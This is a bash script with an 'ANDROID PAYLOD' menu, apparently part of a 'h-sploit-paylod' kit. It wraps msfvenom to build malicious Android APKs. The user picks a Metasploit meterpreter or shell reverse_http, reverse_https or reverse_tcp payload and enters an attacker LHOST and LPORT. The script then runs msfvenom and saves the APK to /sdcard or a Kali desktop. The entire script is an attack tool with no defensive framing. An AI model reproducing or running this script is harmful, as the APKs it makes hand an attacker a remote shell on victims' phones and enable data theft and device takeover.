red='\033[1;31m'
rset='\033[0m'      
grn='\033[1;32m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
#coding section starts :)
clear 
echo ""
clear
echo -e "$pink
                   ╔═╗╔╗╔╔╦╗╦═╗╔═╗╦╔╦╗
                   ╠═╣║║║ ║║╠╦╝║ ║║ ║║
                   ╩ ╩╝╚╝═╩╝╩╚═╚═╝╩═╩╝
                   ╔═╗╔═╗╦ ╦╦  ╔═╗╔╦╗ 
                   ╠═╝╠═╣╚╦╝║  ║ ║ ║║ 
                   ╩  ╩ ╩ ╩ ╩═╝╚═╝═╩╝"
echo ""
echo -e "$grn     ::::::::::::::::::$ylo [ TYPE ]$grn ::::::::::::::::::::$rset"
echo ""
echo -e "$red         ➡ [1]$blue android/meterpreter/reverse_http$rset";
echo -e "$red         ➡ [2]$blue android/meterpreter/reverse_https$rset";
echo -e "$red         ➡ [3]$blue android/meterpreter/reverse_tcp$rset";
echo -e "$red         ➡ [4]$blue android/meterpreter_reverse_http$rset";
echo -e "$red         ➡ [5]$blue android/meterpreter_reverse_https$rset";
echo -e "$red         ➡ [6]$blue android/meterpreter_reverse_tcp$rset";
echo -e "$red         ➡ [7]$blue android/shell/reverse_http$rset";
echo -e "$red         ➡ [8]$blue android/shell/reverse_https$rset";
echo -e "$red         ➡ [9]$blue android/shell/reverse_tcp$rset";
echo -e "$red         ➡ [00]$blue EXII$rset";
echo ""
echo -e "$grn     ::::::::::::::::::$ylo [SELECT]$grn ::::::::::::::::::::$rset"
echo " "
echo -e "$cyan	      ╭─$pink[[[$ylo Select any option$pink]]]$cyan"
read -p "              ╰──────────➤ "  n;
case "$n" in
1) clear
apv='android/meterpreter/reverse_http'
;;
2) clear
apv='android/meterpreter/reverse_https'
;;
3) clear
apv='android/meterpreter/reverse_tcp'
;;
4) clear
apv='android/meterpreter_reverse_http'
;;
5) clear
apv='android/meterpreter_reverse_https'
;;
6) clear
apv='android/meterpreter_reverse_tcp'
;;
7) clear
apv='android/shell/reverse_http'
;;
8) clear
apv='android/shell/reverse_https'
;;
9) clear
apv='android/shell/reverse_tcp'
;;
00) clear
exit
;;
*) clear
echo ""
echo -e "$grn sorry, the  option you looking is not found"
sleep 2.0
cd
cd h-sploit-paylod
cd kit
cd apv
bash apv.sh
clear
esac;
echo ""
clear
echo ""
echo ""
echo -e "$pink ######################################"
echo -e "$ylo ENTER YOUR$blue PAYLOD$ylo NAME$cyan"
read -p "─────➤   "  paylod;
clear
echo ""
echo ""
echo -e "$pink ######################################"
echo -e "$ylo ENTER YOUR$blue LHOST$cyan"
read -p "─────➤   "  lhost;
clear
echo ""
echo ""
echo -e "$pink ######################################"
echo -e "$ylo ENTER YOUR$blue LPORT$cyan"
read -p "─────➤   "  lport;
clear
echo ""
echo ""
echo -e "$grn                $ylo [[[$pink SAVE LOCATION$ylo ]]]$grn $rset"
echo ""
echo -e "$red         ➡ [1]$blue /sdcard/ (termux) $rset";
echo -e "$red         ➡ [2]$blue /home/kali/Desktop/ (Kali Linux) $rset";
echo ""
echo -e "$cyan	     ╭─$pink[[[$ylo Select any option$pink ]]]$cyan"
read -p "             ╰──────────➤ "  h;
case "$h" in
1) clear
save='/sdcard/'
clear
echo ""
echo ""
echo -e "$blue Conform The Detail"
sleep 3.0
echo ""
echo ""
echo -e "$cyan PAYLOD TYPE$ylo =$grn $apv"
sleep 1.5
echo -e "$cyan PAYLOD NAME$ylo =$grn $paylod"
sleep 1.5
echo -e "$cyan LHOST$ylo =$grn $lhost"
sleep 1.5
echo -e "$cyan LPORT$ylo =$grn $lport"
sleep 1.5
echo -e "$cyan SAVE$ylo =$grn $save"
sleep 1.5
echo ""
echo -e "    $red   Edit$pink The Detail ?$grn (\033[1;34my$grn/\033[1;31mn$grn)$rset"
read e1
if [[ $e1 = 'y' ]] ; then
cd 
cd h-sploit-paylod
cd kit
cd apv
bash apv.sh
elif [[ $e1 = 'n' ]] ; then
clear
cd
cd metasploit-framework
echo ""
echo ""
echo -e " $cyan Please wait a$red few minutes$grn "
echo ""
echo "./msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk"
./msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk
fi 
;;
2) clear
save='/home/kali/Desktop/'
clear
echo ""
echo ""
echo -e "$blue Conform The Detail"
sleep 3.0
echo ""
echo ""
echo -e "$cyan PAYLOD TYPE$ylo =$grn $apv"
sleep 1.5
echo -e "$cyan PAYLOD NAME$ylo =$grn $paylod"
sleep 1.5
echo -e "$cyan LHOST$ylo =$grn $lhost"
sleep 1.5
echo -e "$cyan LPORT$ylo =$grn $lport"
sleep 1.5
echo -e "$cyan SAVE$ylo =$grn $save"
sleep 1.5
echo ""
echo -e "    $red   Edit$pink The Detail ?$grn (\033[1;34my$grn/\033[1;31mn$grn)$rset"
read e1
if [[ $e1 = 'y' ]] ; then
cd 
cd h-sploit-paylod
cd kit
cd apv
bash apv.sh
elif [[ $e1 = 'n' ]] ; then
clear
cd
echo ""
echo ""
echo -e " $cyan Please wait a$red few minutes$grn "
echo ""
echo "msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk"
msfvenom -p $apv LHOST=$lhost LPORT=$lport R > $save$paylod.apk
fi
;;
*) clear
echo ""
echo ""
echo -e "$grn sorry, the  option you looking is not found"
sleep 2.0
esac;
echo ""
